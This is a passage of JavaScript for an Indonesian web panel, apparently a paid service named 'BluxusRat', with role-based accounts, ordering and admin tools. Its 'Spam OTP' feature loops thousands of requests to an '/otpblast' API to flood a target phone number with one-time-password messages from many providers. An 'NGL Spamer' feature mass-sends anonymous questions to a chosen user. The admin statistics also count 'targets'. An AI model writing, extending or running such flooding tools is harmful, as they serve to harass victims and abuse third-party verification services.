        <div class="ico-badge"><i class="fa-solid fa-comment"></i></div>
        <textarea id="ngl-q" placeholder="Tulis pertanyaan..."></textarea>
      </div>
    </div>
    <div class="field">
      <label>Limit: <span id="ngl-limit-val">10</span></label>
      <input type="range" id="ngl-limit" min="1" max="100" value="10" style="width:100%">
    </div>
    <div class="ngl-preview" id="ngl-preview">
      <div class="lbl">Preview</div>
      <div class="val" id="ngl-pv-q">—</div>
      <div class="to">to: <b id="ngl-pv-user">—</b></div>
    </div>
    <button class="btn btn-primary" id="ngl-send" style="margin-top:14px"><i class="fa-solid fa-paper-plane"></i> Kirim</button>
    <div id="ngl-result"></div>
    <div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Tutup</button></div>`;
  $("#modal").classList.add("show");
  $("#ngl-limit").oninput = () => { $("#ngl-limit-val").textContent = $("#ngl-limit").value; };
  $("#ngl-user").oninput = () => { $("#ngl-pv-user").textContent = $("#ngl-user").value || "—"; };
  $("#ngl-q").oninput = () => { $("#ngl-pv-q").textContent = $("#ngl-q").value || "—"; };
  $("#ngl-send").onclick = async () => {
    const user = $("#ngl-user").value.trim();
    const q = $("#ngl-q").value.trim();
    const limit = parseInt($("#ngl-limit").value);
    if (!user || !q) return toast("Isi username & pertanyaan", "err");
    const btn = $("#ngl-send");
    btn.disabled = true;
    btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Sending...';
    try {
      const res = await fetch(`${CONFIG.FAZZ_API}/ngl?username=${encodeURIComponent(user)}&question=${encodeURIComponent(q)}&limit=${limit}&api_key=${CONFIG.FAZZ_KEY}`);
      const data = await res.json();
      if (data.status === "success" && data.result) {
        $("#ngl-result").innerHTML = `
          <div class="stat-row" style="margin-top:14px">
            <div class="stat-box success"><div class="l"><i class="fa-solid fa-check"></i> Sukses</div><div class="v">${data.result.sent || 0}</div></div>
            <div class="stat-box fail"><div class="l"><i class="fa-solid fa-xmark"></i> Gagal</div><div class="v">${data.result.failed || 0}</div></div>
            <div class="stat-box total"><div class="l"><i class="fa-solid fa-list"></i> Total</div><div class="v">${limit}</div></div>
          </div>`;
        toast("Terkirim!", "ok");
      } else {
        toast(data.message || "Gagal", "err");
      }
    } catch (e) {
      toast("Koneksi error", "err");
    } finally {
      btn.disabled = false;
      btn.innerHTML = '<i class="fa-solid fa-paper-plane"></i> Kirim';
    }
  };
}

function toolQR() {
  const box = $("#modal-box");
  box.innerHTML = `
    <h3>URL to QR</h3><div class="sub">Ubah URL jadi QR code</div>
    <div class="field">
      <div class="input-wrap">
        <div class="ico-badge"><i class="fa-solid fa-link"></i></div>
        <input type="text" id="qr-url" placeholder="https://example.com">
      </div>
    </div>
    <button class="btn btn-primary" id="qr-gen"><i class="fa-solid fa-qrcode"></i> Generate</button>
    <div id="qr-result"></div>
    <div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Tutup</button></div>`;
  $("#modal").classList.add("show");
  $("#qr-gen").onclick = async () => {
    const url = $("#qr-url").value.trim();
    if (!url) return toast("Isi URL", "err");
    const btn = $("#qr-gen");
    btn.disabled = true;
    btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Loading...';
    try {
      const res = await fetch(`${CONFIG.FAZZ_API}/qr?url=${encodeURIComponent(url)}&api_key=${CONFIG.FAZZ_KEY}`);
      const data = await res.json();
      if (data.status === "success" && data.result?.qr_image) {
        $("#qr-result").innerHTML = `
          <div class="qr-result">
            <img src="${data.result.qr_image}" alt="QR">
            <div class="qr-url">${url}</div>
            <button class="btn btn-ghost" id="qr-copy"><i class="fa-solid fa-copy"></i> Copy URL</button>
          </div>`;
        $("#qr-copy").onclick = async () => {
          haptic(10);
          const ok = await copyToClipboard(url);
          toast(ok ? "URL di-copy" : "Gagal copy", ok ? "ok" : "err");
        };
      } else {
        toast("Gagal generate QR", "err");
      }
    } catch (e) {
      toast("Koneksi error", "err");
    } finally {
      btn.disabled = false;
      btn.innerHTML = '<i class="fa-solid fa-qrcode"></i> Generate';
    }
  };
}

function toolOTP() {
  const box = $("#modal-box");
  box.innerHTML = `
    <h3 style="color:var(--vip)">Spam OTP</h3><div class="sub">Blast OTP ke nomor target (VIP)</div>
    <div class="field">
      <label>Nomor Target</label>
      <div class="input-wrap">
        <div class="ico-badge" style="background:var(--vip-soft)"><i class="fa-solid fa-phone" style="color:var(--vip)"></i></div>
        <input type="tel" id="otp-phone" placeholder="628xxxxxxxxxx">
      </div>
    </div>
    <div class="rondes-box">
      <div class="rb-head">
        <div class="t"><i class="fa-solid fa-repeat" style="color:var(--vip)"></i> PENGULANGAN</div>
        <div class="badge" id="otp-total">= 22500 KIRIMAN</div>
      </div>
      <div class="rondes-input">
        <div class="rb-btn" id="otp-minus">−</div>
        <div class="rb-val" id="otp-rondes">900</div>
        <div class="rb-x">×</div>
        <div class="rb-val" id="otp-mult" style="flex:0.7">25</div>
        <div class="rb-btn" id="otp-plus">+</div>
      </div>
      <div class="multiplier-grid" id="otp-multipliers">
        <div class="m-btn" data-m="1">1x</div>
        <div class="m-btn" data-m="2">2x</div>
        <div class="m-btn" data-m="3">3x</div>
        <div class="m-btn" data-m="5">5x</div>
        <div class="m-btn" data-m="10">10x</div>
        <div class="m-btn active" data-m="25">25x</div>
      </div>
      <div class="rondes-info">Setiap ronde mengirim ke semua provider</div>
    </div>
    <div class="spam-actions">
      <button class="btn-start" id="otp-start"><i class="fa-solid fa-play"></i> <span>START</span></button>
      <button class="btn-reset" id="otp-reset"><i class="fa-solid fa-rotate-left"></i></button>
    </div>
    <div class="progress-card">
      <div class="pc-head">
        <div class="icon-wrap"><i class="fa-solid fa-rotate"></i></div>
        <div class="info">
          <div class="l">PROGRES</div>
          <div class="v" id="otp-progress-text">idle</div>
        </div>
        <div class="pct" id="otp-pct">0%</div>
      </div>
      <div class="progress-bar"><div class="fill" id="otp-fill"></div></div>
      <div class="stat-row">
        <div class="stat-box success"><div class="l"><i class="fa-solid fa-check"></i> SUKSES</div><div class="v" id="otp-succ">0</div></div>
        <div class="stat-box fail"><div class="l"><i class="fa-solid fa-xmark"></i> GAGAL</div><div class="v" id="otp-fail">0</div></div>
        <div class="stat-box total"><div class="l"><i class="fa-solid fa-list"></i> TOTAL</div><div class="v" id="otp-total-count">0</div></div>
      </div>
    </div>
    <div style="font-family:'JetBrains Mono',monospace;font-size:10px;color:var(--text-dim);text-transform:uppercase;letter-spacing:1.5px;margin-bottom:8px">
      <i class="fa-solid fa-terminal" style="color:var(--vip)"></i> LIVE CONSOLE
    </div>
    <div class="console-box" id="otp-console"></div>
    <div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Tutup</button></div>`;
  $("#modal").classList.add("show");
  initOTP();
}

function initOTP() {
  const state = { rondes: 900, mult: 25, current: 0, running: false, success: 0, fail: 0, stopFlag: false };
  const upd = () => {
    $("#otp-rondes").textContent = state.rondes;
    $("#otp-mult").textContent = state.mult;
    const total = state.rondes * state.mult;
    $("#otp-total").textContent = `= ${total} KIRIMAN`;
    $("#otp-total-count").textContent = `${state.success + state.fail}/${total}`;
  };
  $("#otp-minus").onclick = () => { haptic(5); if (state.rondes > 1) { state.rondes--; upd(); } };
  $("#otp-plus").onclick = () => { haptic(5); if (state.rondes < 999) { state.rondes++; upd(); } };
  $$("#otp-multipliers .m-btn").forEach(b => {
    b.onclick = () => {
      haptic(5);
      $$("#otp-multipliers .m-btn").forEach(x => x.classList.remove("active"));
      b.classList.add("active");
      state.mult = parseInt(b.dataset.m);
      upd();
    };
  });
  $("#otp-reset").onclick = () => {
    haptic(10);
    state.current = 0; state.success = 0; state.fail = 0;
    state.stopFlag = true;
    setTimeout(() => state.stopFlag = false, 100);
    upd();
    $("#otp-console").innerHTML = "";
    $("#otp-fill").style.width = "0%";
    $("#otp-pct").textContent = "0%";
  };
  $("#otp-start").onclick = async () => {
    const phone = $("#otp-phone").value.trim();
    if (!phone) return toast("Isi nomor target", "err");
    haptic(20);
    if (state.running) { state.stopFlag = true; return; }
    state.running = true;
    state.stopFlag = false;
    $("#otp-start").classList.add("stop");
    $("#otp-start").innerHTML = `<i class="fa-solid fa-stop"></i> <span>STOP</span>`;
    addConsole("info", `Mulai spam ke ${phone}...`);
    for (let r = state.current; r < state.rondes; r++) {
      if (state.stopFlag) break;
      state.current = r;
      await spamOneRound(phone, state);
      upd();
    }
    state.running = false;
    $("#otp-start").classList.remove("stop");
    $("#otp-start").innerHTML = `<i class="fa-solid fa-play"></i> <span>START</span>`;
    addConsole("info", "Selesai.");
  };
  upd();
}

async function spamOneRound(phone, state) {
  try {
    const res = await fetch(`${CONFIG.FAZZ_API}/otpblast?phone=${phone}&api_key=${CONFIG.FAZZ_KEY}`);
    const data = await res.json();
    if (data.status === "success" || data.result) {
      const details = data.details || data.result?.details || [];
      for (let i = 0; i < state.mult; i++) {
        if (details.length > 0) {
          const d = details[Math.floor(Math.random() * details.length)];
          if (d.success) { state.success++; addConsole("sent", `${d.name || "Provider"} ✓`); }
          else { state.fail++; addConsole("fail", `${d.name || "Provider"} ✗`); }
        } else {
          if (data.success) { state.success++; addConsole("sent", "Provider ✓"); }
          else { state.fail++; addConsole("fail", "Provider ✗"); }
        }
      }
    }
  } catch (e) {
    addConsole("fail", "Network error");
  }
  const total = state.rondes * state.mult;
  const done = state.success + state.fail;
  const pct = Math.min(100, Math.round(done / total * 100));
  $("#otp-fill").style.width = pct + "%";
  $("#otp-pct").textContent = pct + "%";
  $("#otp-succ").textContent = state.success;
  $("#otp-fail").textContent = state.fail;
  $("#otp-total-count").textContent = `${done}/${total}`;
  $("#otp-progress-text").textContent = `Ronde ${state.current + 1}/${state.rondes}`;
}

function addConsole(type, msg) {
  const box = $("#otp-console");
  if (!box) return;
  const line = document.createElement("div");
  line.className = "console-line";
  const badge = type === "sent" ? "SENT" : type === "fail" ? "FAIL" : "INFO";
  line.innerHTML = `<span class="console-ts">[${fmtTime(Date.now())}]</span><span class="console-badge ${type}">${badge}</span><span class="console-msg">${msg}</span>`;
  box.appendChild(line);
  box.scrollTop = box.scrollHeight;
  while (box.children.length > 100) box.removeChild(box.firstChild);
}

// ============================================================
// BENEFIT ROLE
// ============================================================
function goBenefit() {
  showScreen("benefit");
  renderRoleCards();
  renderFAQ();
}

function renderRoleCards() {
  const container = $("#role-cards");
  const order = ["owner", "reseller", "vip", "member"];
  container.innerHTML = order.map(key => {
    const r = PRICE_DATA[key];
    return `
      <div class="role-card ${key}">
        <div class="rc-head">
          <div class="rc-icon"><i class="fa-solid ${r.icon}"></i></div>
          <div class="rc-info">
            <div class="rc-name">${r.label}</div>
            <div class="rc-tagline">${r.tagline}</div>
          </div>
        </div>
        <div class="rc-desc">${r.desc}</div>
        <div class="rc-benefits">
          ${r.benefits.map(b => `<div class="rc-benefit"><i class="fa-solid fa-check"></i><span>${b}</span></div>`).join("")}
        </div>
      </div>`;
  }).join("");
}

function renderFAQ() {
  const list = $("#faq-list");
  list.innerHTML = FAQ_DATA.map((f, i) => `
    <div class="faq-item" data-faq="${i}">
      <div class="faq-q">
        <span>${f.q}</span>
        <i class="fa-solid fa-chevron-right arrow"></i>
      </div>
      <div class="faq-a">${f.a}</div>
    </div>
  `).join("");
  $$(".faq-item").forEach(item => {
    item.querySelector(".faq-q").onclick = () => {
      haptic(8);
      item.classList.toggle("open");
    };
  });
}

// ============================================================
// BELI AKSES
// ============================================================
function goBuy() {
  State.buy = { role: null, days: null, price: null, label: null };
  showScreen("buy");
  setBuyStep(1);
  renderBuyRoles();
  $("#buy-username").value = "";
  $("#buy-email").value = "";
}

function setBuyStep(n) {
  $$(".buy-step").forEach(s => s.classList.remove("active"));
  const step = $("#buy-step-" + n);
  if (step) step.classList.add("active");
  $$(".stepper .step").forEach(s => {
    const sn = parseInt(s.dataset.step);
    s.classList.toggle("active", sn === n);
    s.classList.toggle("done", sn < n);
  });
}

function renderBuyRoles() {
  const grid = $("#buy-role-grid");
  const order = ["member", "vip", "reseller", "owner"];
  grid.innerHTML = order.map(key => {
    const r = PRICE_DATA[key];
    const minPrice = Math.min(...r.options.map(o => o.price));
    return `
      <div class="role-opt" data-role="${key}">
        <div class="ro-icon"><i class="fa-solid ${r.icon}"></i></div>
        <div class="ro-name">${r.label}</div>
        <div class="ro-price">Mulai ${fmtPrice(minPrice)}</div>
      </div>`;
  }).join("");
  $$(".role-opt").forEach(el => {
    el.onclick = () => {
      haptic(10);
      $$(".role-opt").forEach(x => x.classList.remove("selected"));
      el.classList.add("selected");
      State.buy.role = el.dataset.role;
      $("#btn-buy-next-1").disabled = false;
    };
  });
}

function renderBuyDurations() {
  const r = PRICE_DATA[State.buy.role];
  $("#buy-role-selected").innerHTML = `<i class="fa-solid ${r.icon}"></i> Role dipilih: <b>${r.label}</b>`;
  const grid = $("#buy-duration-grid");
  grid.innerHTML = r.options.map((o, i) => `
    <div class="duration-opt" data-idx="${i}">
      <span class="do-label">${o.label}</span>
      <span class="do-price">${fmtPrice(o.price)}</span>
    </div>
  `).join("");
  $$(".duration-opt").forEach(el => {
    el.onclick = () => {
      haptic(10);
      $$(".duration-opt").forEach(x => x.classList.remove("selected"));
      el.classList.add("selected");
      const idx = parseInt(el.dataset.idx);
      const opt = r.options[idx];
      State.buy.days = opt.days;
      State.buy.price = opt.price;
      State.buy.label = opt.label;
      $("#btn-buy-next-2").disabled = false;
    };
  });
  $("#btn-buy-next-2").disabled = true;
}

function validateBuyData() {
  const usn = $("#buy-username").value.trim();
  const email = $("#buy-email").value.trim();
  const validEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
  $("#btn-buy-next-3").disabled = !(usn.length >= 3 && validEmail);
}

async function submitOrder() {
  const usn = $("#buy-username").value.trim();
  const email = $("#buy-email").value.trim();
  const orderId = genOrderId();

  const orderData = {
    orderId,
    role: State.buy.role,
    roleLabel: PRICE_DATA[State.buy.role].label,
    duration: State.buy.days,
    durationLabel: State.buy.label,
    price: State.buy.price,
    username: usn,
    email: email,
    status: "pending",
    createdAt: Date.now(),
    verifiedAt: null,
    verifiedBy: null,
    note: ""
  };

  try {
    await fbSet(fbRef(State.db, "orders/" + orderId), orderData);
    State.order.current = orderData;

    $("#order-detail").innerHTML = `
      <div class="od-id">
        <div class="lbl">Order ID</div>
        <div class="id">${orderId}</div>
      </div>
      <div class="od-row highlight"><span class="l">Role</span><span class="v">${orderData.roleLabel}</span></div>
      <div class="od-row"><span class="l">Durasi</span><span class="v">${orderData.durationLabel}</span></div>
      <div class="od-row"><span class="l">Harga</span><span class="v">${fmtPrice(orderData.price)}</span></div>
      <div class="od-row"><span class="l">Username</span><span class="v">${usn}</span></div>
      <div class="od-row"><span class="l">Email</span><span class="v">${email}</span></div>
    `;
    setBuyStep(4);
  } catch (e) {
    toast("Gagal kirim pesanan: " + e.message, "err");
  }
}

function bayarOrder() {
  const o = State.order.current;
  if (!o) return;
  const msg = encodeURIComponent(
    `Halo Admin, saya mau bayar pesanan akses BluxusRat.\n\n` +
    `Order ID: ${o.orderId}\n` +
    `Role: ${o.roleLabel}\n` +
    `Durasi: ${o.durationLabel}\n` +
    `Harga: ${fmtPrice(o.price)}\n` +
    `Username: ${o.username}\n` +
    `Email: ${o.email}\n\n` +
    `Berikut saya lampirkan struk pembayaran.`
  );
  window.open(`https://wa.me/${CONFIG.WA_ADMIN}?text=${msg}`, "_blank");
}

// ============================================================
// ACCOUNT
// ============================================================
function goAccount() {
  showScreen("account");
  const u = State.user || {};
  $("#acc-usn").textContent = u.username || "—";
  const r = $("#acc-role");
  const role = u.role || "member";
  r.textContent = role;
  r.className = "urole " + role;
  $("#acc-usercode").textContent = u.userCode || "—";
  $("#acc-created").textContent = u.createdAt ? fmtDate(u.createdAt) : "—";
  if (u.avatar) $("#acc-avatar").src = u.avatar;
}

// ============================================================
// PANEL
// ============================================================
function goPanel() {
  const u = State.user || {};
  const role = u.role || "member";
  const perms = ROLE_PERMS[role] || { panel: [] };
  showScreen("panel");
  $("#panel-title").textContent = `${role.charAt(0).toUpperCase() + role.slice(1)} Panel`;
  $("#panel-role-text").textContent = `${role.toUpperCase()} PANEL`;

  if (!perms.panel.length) {
    $("#panel-grid").innerHTML = '<div style="text-align:center;color:var(--text-mute);font-size:12px;padding:20px;grid-column:1/-1">Belum ada fitur panel untuk role ini</div>';
    return;
  }
  $("#panel-grid").innerHTML = perms.panel.map(p => `
    <div class="panel-action" data-action="${p.id}">
      <div class="ico-badge"><i class="fa-solid ${p.icon}"></i></div>
      <div class="txt">${p.name}</div>
    </div>`).join("");
  $$(".panel-action").forEach(el => el.onclick = () => {
    haptic(10);
    openPanelAction(el.dataset.action);
  });
}

function openPanelAction(action) {
  const box = $("#modal-box");
  const forms = {
    add_user: `
      <h3>Tambah Akun</h3>
      <div class="field"><label>Username</label><input id="f-usn" placeholder="username"></div>
      <div class="field"><label>Password</label><input type="password" id="f-pw" placeholder="min 6 karakter"></div>
      <div class="field"><label>Role</label><select id="f-role">${(CREATE_PERMS[State.user.role] || []).map(r => `<option value="${r}">${r.charAt(0).toUpperCase() + r.slice(1)}</option>`).join("")}</select></div>
      <div class="field"><label>Masa Aktif</label><select id="f-days"><option value="1">1 Hari</option><option value="7">7 Hari</option><option value="30" selected>30 Hari</option><option value="">Unlimited</option></select></div>
      <button class="btn btn-primary" id="btn-submit-add">Buat Akun</button>
      <div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Tutup</button></div>`,
    extend_user: `
      <h3>Perpanjang Akun</h3>
      <div class="field"><label>Username</label><input id="f-ext-usn" placeholder="username"></div>
      <div class="field"><label>Tambah Hari</label><select id="f-ext-days"><option value="1">1 Hari</option><option value="7">7 Hari</option><option value="30" selected>30 Hari</option><option value="365">365 Hari</option></select></div>
      <button class="btn btn-primary" id="btn-submit-ext">Perpanjang</button>
      <div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Tutup</button></div>`,
    manage_user: `
      <h3>Manage User</h3>
      <div class="field"><input id="f-search" placeholder="Cari username..."></div>
      <div id="user-list"><div style="text-align:center;color:var(--text-dim);font-size:12px;padding:20px">Ketik untuk cari</div></div>
      <div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Tutup</button></div>`,
    ban_user: `
      <h3>Ban User</h3>
      <div class="field"><label>Username</label><input id="f-ban-usn" placeholder="username"></div>
      <button class="btn btn-danger" id="btn-submit-ban">Ban</button>
      <div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Tutup</button></div>`,
    reset_pw: `
      <h3>Reset Password</h3>
      <div class="field"><label>Username</label><input id="f-reset-usn" placeholder="username"></div>
      <div class="field"><label>Password Baru</label><input type="password" id="f-reset-pw" placeholder="min 6 karakter"></div>
      <button class="btn btn-primary" id="btn-submit-reset">Reset</button>
      <div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Tutup</button></div>`,
    broadcast: `
      <h3>Broadcast</h3>
      <div class="field"><label>Judul</label><input id="f-bc-title" placeholder="Judul"></div>
      <div class="field"><label>Pesan</label><textarea id="f-bc-msg" placeholder="Tulis pesan..."></textarea></div>
      <div class="field"><label>Gambar URL (opsional)</label><input id="f-bc-img" placeholder="https://..."></div>
      <div class="field"><label>Link URL (opsional)</label><input id="f-bc-url" placeholder="https://..."></div>
      <button class="btn btn-primary" id="btn-submit-bc">Kirim</button>
      <div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Tutup</button></div>`,
    stats: `<div id="stat-content"><div style="text-align:center;color:var(--text-dim);font-size:12px;padding:20px">Loading...</div></div>`,
    maintenance: `
      <h3>Maintenance Fitur</h3>
      <div id="maint-list"><div style="text-align:center;color:var(--text-dim);font-size:12px;padding:20px">Loading...</div></div>
      <div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Tutup</button></div>`,
    logs: `
      <h3>Server Logs</h3>
      <div id="logs-content" style="max-height:60vh;overflow-y:auto"><div style="text-align:center;color:var(--text-dim);font-size:12px;padding:20px">Loading...</div></div>
      <div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Tutup</button></div>`
  };
  box.innerHTML = forms[action] || '<h3>Coming soon</h3><div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Tutup</button></div>';
  $("#modal").classList.add("show");

  if (action === "add_user") bindAddUser();
  if (action === "extend_user") bindExtendUser();
  if (action === "manage_user") bindManageUser();
  if (action === "ban_user") bindBanUser();
  if (action === "reset_pw") bindResetPw();
  if (action === "broadcast") bindBroadcast();
  if (action === "stats") loadStats();
  if (action === "maintenance") loadMaintenance();
  if (action === "logs") loadLogs();
}

function bindAddUser() {
  $("#btn-submit-add").onclick = async () => {
    haptic(15);
    const usn = $("#f-usn").value.trim();
    const pw = $("#f-pw").value;
    const role = $("#f-role").value;
    const days = $("#f-days").value;
    if (!usn || !pw) return toast("Isi semua field", "err");
    if (pw.length < 6) return toast("Password min 6 karakter", "err");

    const limit = DAILY_LIMIT[State.user.role];
    if (limit !== null) {
      const today = new Date().toISOString().slice(0, 10);
      const counterKey = `daily_counter/${State.uid}/${today}`;
      const snap = await fbGet(fbRef(State.db, counterKey));
      const current = snap.exists() ? snap.val() : 0;
      if (current >= limit) return toast(`Limit harian tercapai (${limit}/hari)`, "err");
    }

    try {
      const usersSnap = await fbGet(fbRef(State.db, "users"));
      const users = usersSnap.exists() ? usersSnap.val() : {};
      for (const uid in users) {
        if (users[uid].username === usn) return toast("Username udah dipake", "err");
      }

      const salt = genSalt();
      const hash = await sha256(pw + salt);
      const userCode = genUserCode();
      const newRef = fbPush(fbRef(State.db, "users"));
      await fbSet(newRef, {
        username: usn,
        passwordHash: hash,
        passwordSalt: salt,
        role, userCode,
        createdBy: State.uid,
        createdAt: Date.now(),
        expiresAt: days ? Date.now() + parseInt(days) * 86400000 : null,
        banned: false, avatar: ""
      });

      if (limit !== null) {
        const today = new Date().toISOString().slice(0, 10);
        const counterKey = `daily_counter/${State.uid}/${today}`;
        await fbSet(fbRef(State.db, counterKey), (current + 1));
      }

      toast(`Akun ${usn} dibuat. Code: ${userCode}`, "ok", 6000);
      closeModal();
    } catch (e) {
      toast("Gagal: " + e.message, "err");
    }
  };
}

function bindExtendUser() {
  $("#btn-submit-ext").onclick = async () => {
    haptic(15);
    const usn = $("#f-ext-usn").value.trim();
    const days = parseInt($("#f-ext-days").value);
    if (!usn) return toast("Isi username", "err");
    const s = await fbGet(fbRef(State.db, "users"));
    const u = s.val() || {};
    for (const uid in u) {
      if (u[uid].username === usn) {
        if (State.user.role !== "dev" && u[uid].createdBy !== State.uid) {
          return toast("Gak bisa perpanjang akun ini", "err");
        }
        const base = u[uid].expiresAt && u[uid].expiresAt > Date.now() ? u[uid].expiresAt : Date.now();
        await fbUpdate(fbRef(State.db, "users/" + uid), { expiresAt: base + days * 86400000 });
        toast(`+${days} hari buat ${usn}`, "ok");
        closeModal();
        return;
      }
    }
    toast("User gak ditemukan", "err");
  };
}

function bindManageUser() {
  const s = $("#f-search");
  s.oninput = () => {
    clearTimeout(window._st);
    window._st = setTimeout(() => searchUsers(s.value), 400);
  };
}

async function searchUsers(q) {
  const list = $("#user-list");
  if (!q) {
    list.innerHTML = '<div style="text-align:center;color:var(--text-dim);font-size:12px;padding:20px">Ketik untuk cari</div>';
    return;
  }
  try {
    const snap = await fbGet(fbRef(State.db, "users"));
    const users = snap.exists() ? snap.val() : {};
    const results = [];
    for (const uid in users) {
      const u = users[uid];
      if (u.username.toLowerCase().includes(q.toLowerCase())) {
        if (State.user.role !== "dev" && u.createdBy !== State.uid) continue;
        results.push({ uid, ...u });
      }
    }
    if (!results.length) {
      list.innerHTML = '<div style="text-align:center;color:var(--text-dim);font-size:12px;padding:20px">Gak ditemukan</div>';
      return;
    }
    list.innerHTML = results.map(u => `
      <div class="list-item" style="margin-bottom:8px;cursor:default">
        <div class="ico-badge"><i class="fa-solid fa-user"></i></div>
        <div class="txt">
          <div class="n">${u.username}</div>
          <div class="d">${u.role} · ${u.banned ? "banned" : "active"} · ${u.userCode || "—"}</div>
        </div>
      </div>`).join("");
  } catch (e) {}
}

function bindBanUser() {
  $("#btn-submit-ban").onclick = async () => {
    haptic(15);
    const usn = $("#f-ban-usn").value.trim();
    if (!usn) return toast("Isi username", "err");
    const s = await fbGet(fbRef(State.db, "users"));
    const u = s.val() || {};
    for (const uid in u) {
      if (u[uid].username === usn) {
        await fbUpdate(fbRef(State.db, "users/" + uid), { banned: true });
        toast(`User ${usn} di-ban`, "ok");
        closeModal();
        return;
      }
    }
    toast("User gak ditemukan", "err");
  };
}

function bindResetPw() {
  $("#btn-submit-reset").onclick = async () => {
    haptic(15);
    const usn = $("#f-reset-usn").value.trim();
    const pw = $("#f-reset-pw").value;
    if (!usn || !pw) return toast("Isi semua", "err");
    if (pw.length < 6) return toast("Min 6 karakter", "err");
    const s = await fbGet(fbRef(State.db, "users"));
    const u = s.val() || {};
    for (const uid in u) {
      if (u[uid].username === usn) {
        const salt = genSalt();
        const hash = await sha256(pw + salt);
        await fbUpdate(fbRef(State.db, "users/" + uid), { passwordHash: hash, passwordSalt: salt });
        toast(`Password ${usn} direset`, "ok");
        closeModal();
        return;
      }
    }
    toast("User gak ditemukan", "err");
  };
}

function bindBroadcast() {
  $("#btn-submit-bc").onclick = async () => {
    haptic(15);
    const title = $("#f-bc-title").value.trim();
    const msg = $("#f-bc-msg").value.trim();
    const img = $("#f-bc-img").value.trim();
    const url = $("#f-bc-url").value.trim();
    if (!msg) return toast("Isi pesan", "err");
    try {
      const bRef = fbPush(fbRef(State.db, "broadcasts"));
      await fbSet(bRef, { title, message: msg, image: img, url, fromUid: State.uid, createdAt: Date.now() });
      toast("Broadcast terkirim", "ok");
      closeModal();
    } catch (e) {
      toast("Gagal: " + e.message, "err");
    }
  };
}

async function loadStats() {
  const box = $("#stat-content");
  try {
    const users = (await fbGet(fbRef(State.db, "users"))).val() || {};
    const targets = (await fbGet(fbRef(State.db, "targets"))).val() || {};

    let myUsers = {};
    if (State.user.role === "dev") {
      myUsers = users;
    } else if (State.user.role === "reseller") {
      for (const uid in users) {
        if (users[uid].createdBy === State.uid) myUsers[uid] = users[uid];
      }
    } else {
      myUsers = users;
    }

    let total = 0, owners = 0, resellers = 0, vips = 0, members = 0, banned = 0, aktif = 0, expired = 0;
    for (const uid in myUsers) {
      const u = myUsers[uid];
      total++;
      if (u.role === "owner") owners++;
      if (u.role === "reseller") resellers++;
      if (u.role === "vip") vips++;
      if (u.role === "member") members++;
      if (u.banned) banned++;
      if (u.expiresAt && u.expiresAt < Date.now()) expired++;
      else aktif++;
    }

    let tt = 0;
    if (State.user.role === "dev") {
      for (const tid in targets) tt++;
    }

    box.innerHTML = `
      <div class="stat-grid">
        <div class="stat-card"><div class="l">Total Users</div><div class="v accent">${total}</div></div>
        ${State.user.role === "dev" ? `<div class="stat-card"><div class="l">Total Targets</div><div class="v info">${tt}</div></div>` : ""}
        <div class="stat-card"><div class="l">Aktif</div><div class="v success">${aktif}</div></div>
        <div class="stat-card"><div class="l">Expired</div><div class="v warn">${expired}</div></div>
        <div class="stat-card"><div class="l">Banned</div><div class="v" style="color:var(--error)">${banned}</div></div>
        <div class="stat-card"><div class="l">Owners</div><div class="v accent">${owners}</div></div>
        <div class="stat-card"><div class="l">Resellers</div><div class="v success">${resellers}</div></div>
        <div class="stat-card"><div class="l">VIP</div><div class="v vip">${vips}</div></div>
        <div class="stat-card"><div class="l">Members</div><div class="v info">${members}</div></div>
      </div>`;
  } catch (e) {
    box.innerHTML = '<div style="color:var(--error);font-size:12px">Gagal load</div>';
  }
}

async function loadMaintenance() {
  const box = $("#maint-list");
  try {
    const snap = await fbGet(fbRef(State.db, "maintenance"));
    const m = snap.exists() ? snap.val() : {};
    const features = [
      { id: "tolink", name: "To Link" },
      { id: "spotify", name: "Spotify Preview" },
      { id: "gempa", name: "Info Gempa" },
      { id: "ngl", name: "NGL Spamer" },
      { id: "qr", name: "URL to QR" },
      { id: "otp", name: "Spam OTP" },
      { id: "anime", name: "BluxAnime" }
    ];
    box.innerHTML = features.map(f => {
      const isMaint = m[f.id]?.active || false;
      const msg = m[f.id]?.message || "";
      return `
        <div class="toggle-row" style="flex-direction:column;align-items:stretch;gap:10px">
          <div style="display:flex;align-items:center;justify-content:space-between">
            <div class="tr-info"><div class="n">${f.name}</div></div>
            <label class="switch">
              <input type="checkbox" data-feature="${f.id}" ${isMaint ? "checked" : ""}>
              <span class="slider"></span>
            </label>
          </div>
          <input type="text" placeholder="Pesan maintenance (opsional)" value="${msg}" data-msg="${f.id}" style="padding:10px;background:var(--bg-app);border:1px solid var(--border);border-radius:8px;color:var(--text);font-size:12px">
        </div>`;
    }).join("");

    $$("#maint-list input[type='checkbox']").forEach(sw => {
      sw.onchange = async () => {
        haptic(10);
        const feat = sw.dataset.feature;
        const msgInput = $(`input[data-msg="${feat}"]`);
        await fbSet(fbRef(State.db, "maintenance/" + feat), {
          active: sw.checked,
          message: msgInput.value || "Fitur ini sedang maintenance",
          updatedAt: Date.now()
        });
        toast(`${feat}: ${sw.checked ? "Maintenance" : "Aktif"}`, "ok");
      };
    });
    $$("#maint-list input[data-msg]").forEach(inp => {
      inp.onblur = async () => {
        const feat = inp.dataset.msg;
        const sw = $(`input[data-feature="${feat}"]`);
        if (sw && sw.checked) {
          await fbSet(fbRef(State.db, "maintenance/" + feat), {
            active: true,
            message: inp.value || "Fitur ini sedang maintenance",
            updatedAt: Date.now()
          });
        }
      };
    });
  } catch (e) {
    box.innerHTML = '<div style="color:var(--error);font-size:12px;text-align:center;padding:20px">Gagal load</div>';
  }
}

async function loadLogs() {
  const box = $("#logs-content");
  try {
    const snap = await fbGet(fbRef(State.db, "logs"));
    if (!snap.exists()) {
